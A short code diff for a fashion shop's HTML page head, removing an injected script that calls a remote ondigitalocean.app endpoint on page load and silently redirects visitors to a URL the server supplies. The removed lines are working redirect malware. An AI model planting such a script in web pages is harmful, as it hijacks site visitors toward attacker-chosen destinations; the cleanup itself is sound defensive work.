@@ -1,15 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script>
-fetch("http://myredirectiontool-xqn4t.ondigitalocean.app/get.php?site=" + window.location.hostname)
-  .then(res => res.json())
-  .then(data => {
-    if (data.redirect) {
-      window.location.href = data.redirect;
-    }
-  })
-  .catch(function(){});
-</script>
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="VOGUE USA - Premium American Fashion for Men, Women & Kids. Shop the latest trends in clothing, shoes and accessories with free shipping on orders over $75.">
